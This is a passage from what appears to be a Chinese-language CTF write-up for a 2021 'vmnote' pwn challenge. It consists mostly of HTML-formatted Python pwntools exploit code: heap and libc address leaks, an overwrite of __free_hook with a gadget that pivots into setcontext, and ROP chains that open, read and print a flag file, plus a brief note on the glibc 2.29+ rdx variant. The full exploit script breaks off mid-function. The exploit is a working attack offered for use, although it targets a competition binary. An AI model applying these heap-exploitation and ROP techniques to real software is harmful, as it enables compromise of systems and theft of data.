    sl<span class="token punctuation">(</span>flat<span class="token punctuation">(</span><span class="token string">'./flag\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> stack<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    poprax <span class="token operator">=</span> <span class="token number">0x4a550</span> <span class="token operator">+</span> LIBC
    poprdi <span class="token operator">=</span> <span class="token number">0x26b72</span> <span class="token operator">+</span> LIBC
    poprsi <span class="token operator">=</span> <span class="token number">0x27529</span> <span class="token operator">+</span> LIBC
    poprdx <span class="token operator">=</span> <span class="token number">0x11c371</span> <span class="token operator">+</span> LIBC
    syscall <span class="token operator">=</span> <span class="token number">0x66229</span> <span class="token operator">+</span> LIBC

    my_edit<span class="token punctuation">(</span>stack<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>flat<span class="token punctuation">(</span>
        <span class="token comment"># open(&quot;./flag&quot;)</span>
        poprax<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> 
        poprdi<span class="token punctuation">,</span> heap4<span class="token punctuation">,</span> 
        poprsi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        poprdx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        syscall<span class="token punctuation">,</span> 
        <span class="token comment"># read(3, buf, 0x100)</span>
        poprax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        poprdi<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> 
        poprsi<span class="token punctuation">,</span> heap4<span class="token punctuation">,</span> 
        poprdx<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        syscall<span class="token punctuation">,</span> 
        <span class="token comment"># write(1, buf, 0x100)</span>
        poprax<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> 
        poprdi<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> 
        poprsi<span class="token punctuation">,</span> heap4<span class="token punctuation">,</span> 
        poprdx<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        syscall
        <span class="token punctuation">)</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br></div></div><p>更新下另一个解法, 可以使用setcontext, 但是在2.29以后的版本rdi换成了rdx, 找到了一个比较有用的gadget,</p> <blockquote><p>其实要找的gadget大概是, 存在rdi到rdx赋值,最后使用rdx或rdi调整程序流</p></blockquote> <p><img src="https://i.loli.net/2021/07/30/DIyztCB9YQdEFuv.png" alt="image-20210730092531205"></p> <p>然后freehook改为gadget, 然后设置好rdx以后再去setcontext,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>
<span class="token keyword">def</span> <span class="token function">exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload  <span class="token operator">=</span> rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> chunk_list<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> printf<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> heap <span class="token operator">-</span> <span class="token number">0x480</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    heap1 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x480</span> 
    heap2 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x4d0</span>

    
    <span class="token keyword">def</span> <span class="token function">my_new</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">my_dele</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">my_show</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall7<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">my_edit</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> size<span class="token punctuation">,</span> syscall6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    my_new<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span>
    heap3 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x520</span>
    my_dele<span class="token punctuation">(</span>heap3<span class="token punctuation">)</span>

    my_edit<span class="token punctuation">(</span>heap1<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> heap3<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    my_show<span class="token punctuation">(</span>heap3<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;ontent: &quot;</span><span class="token punctuation">)</span>
    main_aeran <span class="token operator">=</span> u64<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_aeran<span class="token punctuation">)</span><span class="token punctuation">)</span>
    LIBC <span class="token operator">=</span> main_aeran <span class="token operator">-</span> <span class="token number">0x1ebbe0</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>LIBC<span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./libc.so.6&quot;</span><span class="token punctuation">)</span>
    env <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span> <span class="token operator">+</span> LIBC 

    gadget <span class="token operator">=</span> LIBC <span class="token operator">+</span> <span class="token number">0x0000000000154930</span>
    setcontext <span class="token operator">=</span> LIBC <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span>
    fhook <span class="token operator">=</span> LIBC <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>

    my_edit<span class="token punctuation">(</span>heap2<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>flat<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> fhook<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    my_edit<span class="token punctuation">(</span>fhook<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>flat<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>

    my_new<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span>
    heap4 <span class="token operator">=</span> heap3 
    my_edit<span class="token punctuation">(</span>heap4<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>

    ret <span class="token operator">=</span> LIBC <span class="token operator">+</span> <span class="token number">0x00000000000c054a</span>
    poprax <span class="token operator">=</span> <span class="token number">0x4a550</span> <span class="token operator">+</span> LIBC
    poprdi <span class="token operator">=</span> <span class="token number">0x26b72</span> <span class="token operator">+</span> LIBC
    poprsi <span class="token operator">=</span> <span class="token number">0x27529</span> <span class="token operator">+</span> LIBC
    poprdx <span class="token operator">=</span> <span class="token number">0x11c371</span> <span class="token operator">+</span> LIBC
    syscall <span class="token operator">=</span> <span class="token number">0x66229</span> <span class="token operator">+</span> LIBC

    flag <span class="token operator">=</span> heap4 <span class="token operator">+</span> <span class="token number">0xb0</span>

    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
        <span class="token number">0</span><span class="token punctuation">,</span> heap4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 0</span>
        setcontext<span class="token operator">+</span><span class="token number">0x3d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 0x20 </span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 30</span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 40 </span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 50 </span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 60 </span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 70</span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 80 </span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment"># 90 </span>
        heap4<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span> ret<span class="token punctuation">,</span> <span class="token comment"># a0</span>
        <span class="token comment"># stack 0xb0</span>
        <span class="token string">'./flag\x00'</span>
        <span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'b'</span><span class="token punctuation">)</span> 
    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>
        <span class="token comment"># open(&quot;./flag&quot;)</span>
        poprax<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> 
        poprdi<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> 
        poprsi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        poprdx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        syscall<span class="token punctuation">,</span> 
        <span class="token comment"># read(3, buf, 0x100)</span>
        poprax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        poprdi<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> 
        poprsi<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> 
        poprdx<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        syscall<span class="token punctuation">,</span> 
        <span class="token comment"># write(1, buf, 0x100)</span>
        poprax<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> 
        poprdi<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> 
        poprsi<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> 
        poprdx<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
        syscall
            <span class="token punctuation">)</span>

    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    my_dele<span class="token punctuation">(</span>heap4<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br></div></div><p>完整exp</p> <details class="custom-block details"><summary>点击查看</summary> <p>或<a href="https://github.com/wlingze/ctf_events/blob/main/other/qwb_2021_vmnote/exp.py" target="_blank" rel="noopener noreferrer">github<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># vim:fenc=utf-8</span>
<span class="token comment">#</span>
<span class="token comment"># Copyright © 2020 wlz &lt;wlz@kyria&gt;</span>
<span class="token comment">#</span>
<span class="token comment"># Distributed under terms of the MIT license.</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

pie  <span class="token operator">=</span> <span class="token number">1</span>
arch <span class="token operator">=</span> <span class="token number">64</span>
bps  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x000000000003BE3</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;challenge &quot;</span><span class="token punctuation">)</span>
    random <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x12345678</span>
    payload <span class="token operator">=</span> <span class="token string">&quot;01d_6u7_v190r0u5_&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'passcode: '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">,</span> con<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;choice&gt;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;idx:&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;content:&quot;</span><span class="token punctuation">,</span> con<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;choice&gt;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;idx:&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;choice&gt;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;4&quot;</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;idx:&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

ret <span class="token operator">=</span> <span class="token number">0x653</span>
pop <span class="token operator">=</span> <span class="token number">0x6ca</span>
read <span class="token operator">=</span> <span class="token number">0x5ef</span>
leave <span class="token operator">=</span> <span class="token number">0x737</span>
printf <span class="token operator">=</span> <span class="token number">0x6a8</span>
strchange <span class="token operator">=</span> <span class="token number">0x1000</span>
chunk_list <span class="token operator">=</span> <span class="token number">0x1520</span>

time <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">def</span> <span class="token function">rop</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> flat<span class="token punctuation">(</span>number<span class="token punctuation">,</span> arr<span class="token punctuation">,</span> pop<span class="token punctuation">,</span> number<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> read<span class="token punctuation">,</span> leave<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exp1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    change<span class="token punctuation">(</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> pop<span class="token punctuation">,</span> <span class="token number">0x653</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> read<span class="token punctuation">,</span> leave<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;choice&gt;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">&quot;idx:&quot;</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    payload  <span class="token operator">=</span> rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> strchange<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> printf<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;challenge&quot;</span><span class="token punctuation">)</span>

syscall3 <span class="token operator">=</span> <span class="token number">0x77</span>
syscall4 <span class="token operator">=</span> <span class="token number">0x86</span>
syscall6 <span class="token operator">=</span> <span class="token number">0xa4</span>
syscall7 <span class="token operator">=</span> <span class="token number">0xb6</span>

<span class="token keyword">def</span> <span class="token function">exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload  <span class="token operator">=</span> rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> chunk_list<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> printf<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> heap <span class="token operator">-</span> <span class="token number">0x480</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    heap1 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x480</span> 
    heap2 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x4d0</span>

    
    <span class="token keyword">def</span> <span class="token function">my_new</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">my_dele</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">my_show</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall7<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">my_edit</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>
